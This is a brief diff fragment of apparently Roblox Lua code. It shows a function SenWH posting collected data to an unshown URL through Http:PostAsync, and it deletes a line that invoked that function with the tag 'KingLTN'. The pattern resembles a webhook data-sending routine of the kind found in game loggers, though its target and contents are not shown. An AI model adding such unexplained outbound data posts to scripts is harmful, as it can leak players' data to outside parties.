@@ -167,4 +167,3 @@ local function SenWH(data)
    Http:PostAsync(url, senall)
 end
 wait(5)
-SenWH(data, "KingLTN")
